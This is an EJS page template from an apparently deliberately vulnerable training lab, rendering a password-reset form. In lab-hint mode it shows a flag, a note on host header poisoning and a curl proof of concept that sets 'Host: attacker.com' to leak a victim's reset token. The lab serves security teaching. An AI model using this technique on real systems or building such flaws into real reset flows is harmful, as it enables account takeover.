<%- include('../partials/navbar') %>
  <main class="main-content">
    <div class="top-header"><span class="header-title">Password Reset</span></div>
    <div class="page-body">
      <div class="page-header"><h1>Reset Your Password</h1><p>Enter your email address to receive a reset link.</p></div>
      <div style="max-width:500px;">
        <div class="card">
          <div class="card-body">
            <% if (!sent) { %>
            <form action="/forgot-password-v2" method="POST">
              <div class="form-group"><label>Email Address</label><input type="email" name="email" required placeholder="you@company.com"></div>
              <button type="submit" class="btn btn-primary">Send Reset Link</button>
            </form>
            <% } else { %>
            <div class="alert alert-success">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
              Reset link sent (simulated). Check below in lab mode.
            </div>
            <% if(locals.lab && lab.showHints){ %>
            <div style="margin-top:16px;background:var(--page-bg);border:1px solid var(--border);border-radius:var(--radius);padding:16px;">
              <div style="font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;margin-bottom:8px;">Generated Reset Link (Dev Mode)</div>
              <code style="font-size:12px;word-break:break-all;"><%= resetLink %></code>
              <% if(flag){ %>
              <div style="margin-top:12px;padding:10px;background:var(--danger-bg);border-radius:var(--radius);font-family:monospace;font-size:12px;color:var(--danger);">🚩 <%= flag %></div>
              <% } %>
              <div style="font-size:11px;color:var(--text-muted);margin-top:8px;">
                Attack: set <code>Host: attacker.com</code> header → victim clicks link to attacker's server with valid reset token.
              </div>
            </div>
            <% } %>
            <% } %>
          </div>
        </div>
        <% if(locals.lab && lab.showHints){ %>
        <div class="card" style="margin-top:16px;border-color:var(--warning);">
          <div class="card-header"><h3 style="color:var(--warning);">⚠️ Attack PoC</h3></div>
          <div class="card-body"><pre style="font-size:11px;">curl -X POST http://syntex.local/forgot-password-v2 \
  -H "Host: attacker.com" \
  -d "email=admin@syntex.local"</pre></div>
        </div>
        <% } %>
      </div>
    </div>
  </main>
</div><%- include('../partials/footer') %>
